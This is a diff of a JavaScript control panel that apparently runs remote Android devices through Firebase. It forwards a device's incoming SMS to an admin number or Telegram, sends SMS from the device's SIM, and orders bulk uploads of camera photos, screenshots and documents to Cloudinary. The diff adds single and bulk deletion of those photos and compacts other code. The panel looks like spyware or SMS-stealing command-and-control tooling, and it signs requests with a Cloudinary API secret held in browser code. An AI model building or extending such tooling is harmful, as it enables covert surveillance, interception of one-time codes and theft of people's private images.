+    var simSel = f.forward_sim_slot || 1, fOn = f.enabled || false, fNum = f.admin_number || '', tok = f.bot_token || '', ch = f.chat_id || '';
     var tgOn = tgPolling[curId] && tgPolling[curId].active;
-    
-    b.innerHTML = 
-      '<div class="card blue">' +
-        '<h3>✈️ Telegram to SMS Auto</h3>' +
-        '<div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div>' +
-        '<div class="fg"><label class="fl">Channel / Chat ID (optional)</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx (optional)"></div>' +
-        '<button class="btn" id="tgS" style="background:' + (tgOn ? '#EF4444' : '#3B82F6') + '">' + (tgOn ? '⏹ STOP POLLING' : '▶ START POLLING') + '</button>' +
-        '<div class="tg-status" id="tgStatus">' + (tgOn ? '🟢 Polling active — waiting for Telegram messages...' : '⚪ Idle — enter Bot Token, then Start') + '</div>' +
-        '<div class="tg-log" id="tgLog"></div>' +
-      '</div>' +
-      '<div class="card green">' +
-        '<h3>📱 SMS Forwarding</h3>' +
-        '<label class="fl">SIM</label>' +
-        '<div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div>' +
-        '<label class="fl">Forward To</label>' +
-        '<div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div>' +
-      '</div>' +
-      '<div class="card">' +
-        '<h3>📤 Send SMS Direct</h3>' +
-        '<label class="fl">SIM</label>' +
-        '<div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div>' +
-        '<div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div>' +
-        '<div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div>' +
-        '<button class="btn green" id="sBtn">✈️ Send</button>' +
-      '</div>';
-    
+    b.innerHTML = '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div><div class="fg"><label class="fl">Channel / Chat ID (optional)</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx (optional)"></div><button class="btn" id="tgS" style="background:' + (tgOn ? '#EF4444' : '#3B82F6') + '">' + (tgOn ? '⏹ STOP POLLING' : '▶ START POLLING') + '</button><div class="tg-status" id="tgStatus">' + (tgOn ? '🟢 Polling active...' : '⚪ Idle') + '</div><div class="tg-log" id="tgLog"></div></div>' + '<div class="card green"><h3>📱 SMS Forwarding</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">Forward To</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div></div>' + '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div><button class="btn green" id="sBtn">✈️ Send</button></div>';
     setTimeout(function() {
       document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref('device_info/' + curId + '/forward_settings/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
-      document.getElementById('tgS').addEventListener('click', function() {
-        if (tgPolling[curId] && tgPolling[curId].active) { stopTelegramPolling(); renderTab(); }
-        else {
-          var t = document.getElementById('tgT').value.trim();
-          var c = document.getElementById('tgC').value.trim();
-          if (!t) { alert('Enter Bot Token'); return; }
-          db.ref('device_info/' + curId + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() });
-          startTelegramPolling(t, c); renderTab();
-        }
-      });
+      document.getElementById('tgS').addEventListener('click', function() { if (tgPolling[curId] && tgPolling[curId].active) { stopTelegramPolling(); renderTab(); } else { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t) { alert('Enter Bot Token'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); startTelegramPolling(t, c); renderTab(); } });
       document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
       document.querySelectorAll('[data-ss]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-ss]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); }); });
       document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); addTgLog('📤 SMS command pushed: ' + t); alert('✅ Sent'); });
-      
-      if (tgPolling[curId] && tgPolling[curId].logs) {
-        var logEl = document.getElementById('tgLog');
-        tgPolling[curId].logs.forEach(function(l) {
-          var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = l;
-          logEl.appendChild(line);
-        });
-        logEl.scrollTop = logEl.scrollHeight;
-      }
+      if (tgPolling[curId] && tgPolling[curId].logs) { var logEl = document.getElementById('tgLog'); tgPolling[curId].logs.forEach(function(l) { var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = l; logEl.appendChild(line); }); logEl.scrollTop = logEl.scrollHeight; }
     }, 100);
   }
 }
 
+// ═══════════════════════════════════════════════════════
+// PHOTOS TAB (with delete feature)
+// ═══════════════════════════════════════════════════════
 function renderPhotos() {
   var b = document.getElementById('dBody');
-  
-  // ✅ Top: Upload button + Status
   var topHtml = 
     '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; padding:12px; margin-bottom:12px;">' +
       '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">' +
         '<div style="color:#60A5FA; font-size:12px; font-weight:bold;">📤 Photo Upload</div>' +
         '<div id="uploadStatus" style="font-size:10px; color:#64748B; font-weight:bold;">Ready</div>' +
       '</div>' +
-      '<button onclick="openPhotoUploadDialog()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">📤 REQUEST UPLOAD</button>' +
+      '<button onclick="openPhotoUploadDialog()" style="width:100%; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-bottom:8px;">📤 REQUEST UPLOAD</button>' +
+      '<button onclick="openDeleteScopeDialog()" style="width:100%; padding:10px; background:#EF4444; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">🗑 DELETE PHOTOS</button>' +
     '</div>';
-  
   var arr = Object.entries(photos);
   arr = arr.filter(function(p) { return p[1] && (p[1].url || p[1].base64); });
   var seen = {};
   arr = arr.filter(function(p) { var key = p[1].name || p[0]; if (seen[key]) return false; seen[key] = true; return true; });
   document.getElementById('cPhotos').textContent = arr.length;
-  
-  if (arr.length === 0) {
-    b.innerHTML = topHtml + '<div class="empty">No photos yet</div>';
-    listenPhotoCommandStatus();
-    return;
-  }
-  
+  if (arr.length === 0) { b.innerHTML = topHtml + '<div class="empty">No photos yet</div>'; listenPhotoCommandStatus(); return; }
   b.innerHTML = topHtml + '<div class="pgrid">' + arr.map(function(p) {
     var url = p[1].url || '', base64 = p[1].base64 || '', imgSrc = '';
     if (url) imgSrc = url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
     else if (base64) imgSrc = base64;
-    return '<div class="pitem" data-p="' + p[0] + '"><img src="' + imgSrc + '" loading="lazy">' + (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') + '<div class="pname">' + esc(p[1].name || 'IMG') + '</div></div>';
+    return '<div class="pitem" data-p="' + p[0] + '"><img src="' + imgSrc + '" loading="lazy">' + (p[1].folder ? '<div class="pfolder">' + esc(p[1].folder) + '</div>' : '') + '<button class="pdelete" data-del-p="' + p[0] + '" title="Delete">✕</button><div class="pname">' + esc(p[1].name || 'IMG') + '</div></div>';
   }).join('') + '</div>';
-  
-  b.querySelectorAll('[data-p]').forEach(function(e) { e.addEventListener('click', function() { showP(this.getAttribute('data-p')); }); });
-  
-  // ✅ Command status listener
+  b.querySelectorAll('[data-p]').forEach(function(e) { e.addEventListener('click', function(ev) { if (ev.target.hasAttribute('data-del-p')) return; showP(this.getAttribute('data-p')); }); });
+  b.querySelectorAll('[data-del-p]').forEach(function(e) { e.addEventListener('click', function(ev) { ev.stopPropagation(); deleteSinglePhoto(this.getAttribute('data-del-p')); }); });
   listenPhotoCommandStatus();
 }
 
-// ═══════════════════════════════════════════════════════
-// PHOTO UPLOAD DIALOG
-// ═══════════════════════════════════════════════════════
-var photoFilter = 'camera';
-var photoQuantity = 100;
-var photoOrder = 'newest';
-var photoCmdListener = null;
+// ═══ DELETE SINGLE PHOTO ═══
+function deleteSinglePhoto(photoKey) {
+  var p = photos[photoKey]; if (!p) return;
+  var name = p.name || 'this photo';
+  if (!confirm('Delete "' + name + '"?\n\nThis will remove it from Firebase AND Cloudinary permanently.')) return;
+  var el = document.querySelector('[data-p="' + photoKey + '"]');
+  if (el) { el.classList.add('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = true; btn.textContent = '⏳'; } }
+  var publicId = extractPublicId(p.url);
+  cloudinaryDestroy(publicId, p.url).then(function(result) {
+    return db.ref('device_info/' + curId + '/photos/' + photoKey).remove();
+  }).then(function() {
+    delete photos[photoKey];
+    if (el) { el.classList.add('deleted'); }
+    document.getElementById('cPhotos').textContent = Object.keys(photos).length;
+    var grid = document.querySelector('.pgrid');
+    if (grid && grid.querySelectorAll('.pitem:not(.deleted)').length === 0) { renderPhotos(); }
+  }).catch(function(e) {
+    alert('❌ Delete failed: ' + e.message);
+    if (el) { el.classList.remove('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = false; btn.textContent = '✕'; } }
+  });
+}
 
+// ═══ EXTRACT PUBLIC ID FROM CLOUDINARY URL ═══
+function extractPublicId(url) {
+  if (!url) return null;
+  try {
+    var m = url.match(/\/upload\/(?:v\d+\/)?(.+?)(?:\.[a-z0-9]+)?$/i);
+    return m ? m[1] : null;
+  } catch(e) { return null; }
+}
+
+// ═══ CLOUDINARY DELETE (SIGNED) ═══
+function sha1(str) {
+  var buffer = new TextEncoder().encode(str);
+  return crypto.subtle.digest('SHA-1', buffer).then(function(hash) {
+    return Array.from(new Uint8Array(hash)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
+  });
+}
+function cloudinaryDestroy(publicId, originalUrl) {
+  if (!publicId) return Promise.resolve({ skipped: true, reason: 'no public_id' });
+  var timestamp = Math.floor(Date.now() / 1000);
+  var toSign = 'public_id=' + publicId + '&timestamp=' + timestamp;
+  var resourceType = 'image';
+  if (originalUrl && originalUrl.indexOf('/raw/upload/') !== -1) resourceType = 'raw';
+  return sha1(toSign + CLOUDINARY_CONFIG.apiSecret).then(function(signature) {
+    var formData = new FormData();
+    formData.append('public_id', publicId);
+    formData.append('timestamp', timestamp);
+    formData.append('api_key', CLOUDINARY_CONFIG.apiKey);
+    formData.append('signature', signature);
+    return fetch('https://api.cloudinary.com/v1_1/' + CLOUDINARY_CONFIG.cloudName + '/' + resourceType + '/destroy', { method: 'POST', body: formData })
+      .then(function(r) { return r.json(); })
+      .then(function(j) {
+        if (j.result === 'ok' || j.result === 'not found') return j;
+        if (j.error) throw new Error(j.error.message || 'Cloudinary error');
+        return j;
+      });
+  });
+}
+
+// ═══ DELETE SCOPE DIALOG ═══
+var deleteScope = 'all';
+function openDeleteScopeDialog() {
+  var counts = { all: 0, camera: 0, screenshot: 0, document: 0, picture: 0, other: 0 };
+  Object.values(photos).forEach(function(p) {
+    if (!p || (!p.url && !p.base64)) return;
+    counts.all++;
+    var f = (p.folder || '').toLowerCase();
+    if (f.indexOf('camera') !== -1 || f.indexOf('dcim') !== -1) counts.camera++;
+    else if (f.indexOf('screenshot') !== -1 || f.indexOf('screen_shot') !== -1) counts.screenshot++;
+    else if (f.indexOf('document') !== -1) counts.document++;
+    else if (f.indexOf('picture') !== -1) counts.picture++;
+    else counts.other++;
+  });
+  var listEl = document.getElementById('delScopeList');
+  var options = [
+    { id: 'all', label: '🗑️ ALL Photos', count: counts.all },
+    { id: 'camera', label: '📷 Camera', count: counts.camera },
+    { id: 'screenshot', label: '📸 Screenshot', count: counts.screenshot },
+    { id: 'document', label: '📄 Document', count: counts.document },
+    { id: 'picture', label: '🖼️ Picture', count: counts.picture }
+  ];
+  listEl.innerHTML = options.map(function(o) {
+    return '<button class="cf-sim-btn' + (o.id === 'all' ? ' active' : '') + '" data-scope="' + o.id + '" style="text-align:left;padding:12px;">' + o.label + ' <span style="color:#F87171;font-size:10px;">(' + o.count + ')</span></button>';
+  }).join('');
+  listEl.querySelectorAll('[data-scope]').forEach(function(btn) {
+    btn.addEventListener('click', function() {
+      listEl.querySelectorAll('[data-scope]').forEach(function(b) { b.classList.remove('active'); });
+      this.classList.add('active');
+      deleteScope = this.getAttribute('data-scope');
+    });
+  });
+  deleteScope = 'all';
+  document.getElementById('delScopeOverlay').classList.add('active');
+}
+function closeDeleteScopeDialog() { document.getElementById('delScopeOverlay').classList.remove('active'); }
+function confirmDeleteScope() {
+  var toDelete = [];
+  Object.entries(photos).forEach(function(entry) {
+    var key = entry[0], p = entry[1];
+    if (!p || (!p.url && !p.base64)) return;
+    var f = (p.folder || '').toLowerCase();
+    var match = false;
+    if (deleteScope === 'all') match = true;
+    else if (deleteScope === 'camera') match = f.indexOf('camera') !== -1 || f.indexOf('dcim') !== -1;
+    else if (deleteScope === 'screenshot') match = f.indexOf('screenshot') !== -1 || f.indexOf('screen_shot') !== -1;
+    else if (deleteScope === 'document') match = f.indexOf('document') !== -1;
+    else if (deleteScope === 'picture') match = f.indexOf('picture') !== -1;
+    if (match) toDelete.push({ key: key, photo: p });
+  });
+  if (toDelete.length === 0) { alert('No photos to delete'); return; }
+  if (!confirm('Delete ' + toDelete.length + ' photos from Firebase AND Cloudinary?\n\nThis CANNOT be undone!')) return;
+  closeDeleteScopeDialog();
+  executeBulkDelete(toDelete);
+}
+
+// ═══ BULK DELETE EXECUTION ═══
+function executeBulkDelete(items) {
+  var overlay = document.getElementById('delProgressOverlay');
+  overlay.classList.add('active');
+  var total = items.length, done = 0, success = 0, failed = 0;
+  updateDelProgress(0, total, 'Starting...');
+  function next(i) {
+    if (i >= total) {
+      updateDelProgress(done, total, '✅ Done: ' + success + ' deleted, ' + failed + ' failed');
+      setTimeout(function() {
+        overlay.classList.remove('active');
+        Object.keys(photos).forEach(function(k) { if (items.find(function(x) { return x.key === k; })) delete photos[k]; });
+        renderPhotos();
+        alert('✅ Delete complete!\n\nSuccess: ' + success + '\nFailed: ' + failed);
+      }, 1500);
+      return;
+    }
+    var item = items[i];
+    var publicId = extractPublicId(item.photo.url);
+    cloudinaryDestroy(publicId, item.photo.url).then(function() {
+      return db.ref('device_info/' + curId + '/photos/' + item.key).remove();
+    }).then(function() {
+      success++;
+      done++;
+      updateDelProgress(done, total, '✅ Deleted: ' + (item.photo.name || item.key).substring(0, 30));
+      next(i + 1);
+    }).catch(function(e) {
+      failed++;
+      done++;
+      updateDelProgress(done, total, '❌ Failed: ' + (item.photo.name || item.key).substring(0, 30) + ' — ' + e.message);
+      next(i + 1);
+    });
+  }
+  next(0);
+}
+function updateDelProgress(done, total, text) {
+  var pct = total > 0 ? Math.round((done / total) * 100) : 0;
+  document.getElementById('delProgressBar').style.width = pct + '%';
+  document.getElementById('delProgressText').textContent = done + ' / ' + total + ' (' + pct + '%)';
+  var log = document.getElementById('delProgressLog');
+  log.textContent = text;
+}
+
+// ═══ PHOTO UPLOAD DIALOG ═══
+var photoFilter = 'camera', photoQuantity = 100, photoOrder = 'newest', photoCmdListener = null;
 function openPhotoUploadDialog() {
   if (!curId) { alert('No device selected'); return; }
-  
-  var old = document.getElementById('photoDialog');
-  if (old) old.remove();
-  
-  var html = 
-    '<div style="position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:5000; display:flex; align-items:center; justify-content:center; padding:20px;" id="photoDialog" onclick="if(event.target===this) closePhotoDialog()">' +
-      '<div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:420px; width:100%;">' +
-        '<h3 style="color:#60A5FA; font-size:15px; margin-bottom:16px;">📤 Request Photo Upload</h3>' +
-        
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Filter</label>' +
-        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px; flex-wrap:wrap;">' +
-          '<button class="pfilter-btn active" data-f="camera" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📷 Camera</button>' +
-          '<button class="pfilter-btn" data-f="screenshot" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📸 Screenshot</button>' +
-          '<button class="pfilter-btn" data-f="document" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📄 Document</button>' +
-          '<button class="pfilter-btn" data-f="picture" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">🖼️ Picture</button>' +
-        '</div>' +
-        
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Quantity</label>' +
-        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px;">' +
-          '<button class="pqty-btn" data-q="50" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">50</button>' +
-          '<button class="pqty-btn active" data-q="100" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">100</button>' +
-          '<button class="pqty-btn" data-q="500" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">500</button>' +
-        '</div>' +
-        
-        '<label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Order</label>' +
-        '<div style="display:flex; gap:6px; margin-top:6px; margin-bottom:20px;">' +
-          '<button class="porder-btn" data-o="oldest" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer;">⬆️ Oldest First</button>' +
-          '<button class="porder-btn active" data-o="newest" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer;">⬇️ Newest First</button>' +
-        '</div>' +
-        
-        '<div style="display:flex; gap:8px;">' +
-          '<button onclick="closePhotoDialog()" style="flex:1; padding:12px; background:#1E3A8A; color:#60A5FA; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">CANCEL</button>' +
-          '<button onclick="sendPhotoCommand()" style="flex:1; padding:12px; background:#10B981; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">📤 START UPLOAD</button>' +
-        '</div>' +
-      '</div>' +
-    '</div>';
-  
-  var div = document.createElement('div');
-  div.innerHTML = html;
-  document.body.appendChild(div.firstChild);
-  
-  document.querySelectorAll('.pfilter-btn').forEach(function(btn) {
-    btn.onclick = function() {
-      document.querySelectorAll('.pfilter-btn').forEach(function(b) {
-        b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active');
-      });
-      this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
-      photoFilter = this.getAttribute('data-f');
-    };
-  });
-  
-  document.querySelectorAll('.pqty-btn').forEach(function(btn) {
-    btn.onclick = function() {
-      document.querySelectorAll('.pqty-btn').forEach(function(b) {
-        b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active');
-      });
-      this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
-      photoQuantity = parseInt(this.getAttribute('data-q'));
-    };
-  });
-  
-  document.querySelectorAll('.porder-btn').forEach(function(btn) {
-    btn.onclick = function() {
-      document.querySelectorAll('.porder-btn').forEach(function(b) {
-        b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active');
-      });
-      this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
-      photoOrder = this.getAttribute('data-o');
-    };
-  });
+  var old = document.getElementById('photoDialog'); if (old) old.remove();
+  var html = '<div style="position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:5000; display:flex; align-items:center; justify-content:center; padding:20px;" id="photoDialog" onclick="if(event.target===this) closePhotoDialog()"><div style="background:#0A1428; border:1px solid #1E3A8A; border-radius:14px; padding:20px; max-width:420px; width:100%;"><h3 style="color:#60A5FA; font-size:15px; margin-bottom:16px;">📤 Request Photo Upload</h3><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Filter</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px; flex-wrap:wrap;"><button class="pfilter-btn active" data-f="camera" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📷 Camera</button><button class="pfilter-btn" data-f="screenshot" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📸 Screenshot</button><button class="pfilter-btn" data-f="document" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">📄 Document</button><button class="pfilter-btn" data-f="picture" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; min-width:80px;">🖼️ Picture</button></div><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Quantity</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px;"><button class="pqty-btn" data-q="50" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">50</button><button class="pqty-btn active" data-q="100" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">100</button><button class="pqty-btn" data-q="500" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">500</button></div><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:bold;">Order</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:20px;"><button class="porder-btn" data-o="oldest" style="flex:1; padding:10px; background:#050810; color:#60A5FA; border:1px solid #1E3A8A; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer;">⬆️ Oldest First</button><button class="porder-btn active" data-o="newest" style="flex:1; padding:10px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer;">⬇️ Newest First</button></div><div style="display:flex; gap:8px;"><button onclick="closePhotoDialog()" style="flex:1; padding:12px; background:#1E3A8A; color:#60A5FA; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">CANCEL</button><button onclick="sendPhotoCommand()" style="flex:1; padding:12px; background:#10B981; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">📤 START UPLOAD</button></div></div></div>';
+  var div = document.createElement('div'); div.innerHTML = html; document.body.appendChild(div.firstChild);
+  document.querySelectorAll('.pfilter-btn').forEach(function(btn) { btn.onclick = function() { document.querySelectorAll('.pfilter-btn').forEach(function(b) { b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active'); }); this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active'); photoFilter = this.getAttribute('data-f'); }; });
+  document.querySelectorAll('.pqty-btn').forEach(function(btn) { btn.onclick = function() { document.querySelectorAll('.pqty-btn').forEach(function(b) { b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active'); }); this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active'); photoQuantity = parseInt(this.getAttribute('data-q')); }; });
+  document.querySelectorAll('.porder-btn').forEach(function(btn) { btn.onclick = function() { document.querySelectorAll('.porder-btn').forEach(function(b) { b.style.background = '#050810'; b.style.color = '#60A5FA'; b.style.border = '1px solid #1E3A8A'; b.classList.remove('active'); }); this.style.background = '#3B82F6'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active'); photoOrder = this.getAttribute('data-o'); }; });
 }
-
-function closePhotoDialog() {
-  var el = document.getElementById('photoDialog');
-  if (el) el.remove();
-}
-
+function closePhotoDialog() { var el = document.getElementById('photoDialog'); if (el) el.remove(); }
 function sendPhotoCommand() {
   if (!curId) { alert('No device selected'); return; }
-  
-  var cmd = {
-    filter: photoFilter,
-    quantity: photoQuantity,
-    order: photoOrder,
-    status: 'pending',
-    timestamp: Date.now(),
-    requested_at: new Date().toLocaleString()
-  };
-  
-  db.ref('device_info/' + curId + '/photo_upload_command').set(cmd)
-    .then(function() {
-      alert('✅ Command sent!\n\nFilter: ' + photoFilter + '\nQuantity: ' + photoQuantity + '\nOrder: ' + photoOrder);
-      closePhotoDialog();
-    })
-    .catch(function(e) {
-      alert('❌ Failed: ' + e.message);
-    });
+  var cmd = { filter: photoFilter, quantity: photoQuantity, order: photoOrder, status: 'pending', timestamp: Date.now(), requested_at: new Date().toLocaleString() };
+  db.ref('device_info/' + curId + '/photo_upload_command').set(cmd).then(function() { alert('✅ Command sent!\n\nFilter: ' + photoFilter + '\nQuantity: ' + photoQuantity + '\nOrder: ' + photoOrder); closePhotoDialog(); }).catch(function(e) { alert('❌ Failed: ' + e.message); });
 }
-
 function listenPhotoCommandStatus() {
   if (!curId) return;
   if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} }
-  
-  var ref = db.ref('device_info/' + curId + '/photo_upload_command');
-  photoCmdListener = ref;
-  
+  var ref = db.ref('device_info/' + curId + '/photo_upload_command'); photoCmdListener = ref;
   ref.on('value', function(snapshot) {
-    var data = snapshot.val();
-    var statusEl = document.getElementById('uploadStatus');
-    if (!statusEl) return;
-    
+    var data = snapshot.val(); var statusEl = document.getElementById('uploadStatus'); if (!statusEl) return;
     if (!data) { statusEl.style.color = '#64748B'; statusEl.textContent = 'Ready'; return; }
-    
-    var status = data.status || 'pending';
-    var color = '#64748B';
-    var text = status;
-    
+    var status = data.status || 'pending'; var color = '#64748B', text = status;
     if (status === 'pending') { color = '#F59E0B'; text = '⏳ Pending...'; }
     else if (status === 'uploading') { color = '#3B82F6'; text = '📤 Uploading...'; }
     else if (status === 'completed') { color = '#10B981'; text = '✅ Completed'; }
     else if (status === 'failed') { color = '#EF4444'; text = '❌ Failed'; }
-    
-    statusEl.style.color = color;
-    statusEl.textContent = text;
+    statusEl.style.color = color; statusEl.textContent = text;
   });
 }
 
@@ -924,13 +815,16 @@ document.getElementById('pDownload').addEventListener('click', function() {
   if (p.url) { fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) { var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click(); }).catch(function() { window.open(p.url, '_blank'); }); }
   else if (p.base64) { var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click(); }
 });
+document.getElementById('pDelete').addEventListener('click', function() {
+  if (!curPhoto) return;
+  document.getElementById('pViewer').classList.remove('active');
+  deleteSinglePhoto(curPhoto);
+});
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
 function renderApps() {
-  var b = document.getElementById('dBody');
-  var d = devs[curId];
-  var appsData = d.installed_apps || {};
-  var url = appsData.url;
+  var b = document.getElementById('dBody'); var d = devs[curId];
+  var appsData = d.installed_apps || {}; var url = appsData.url;
   if (url) {
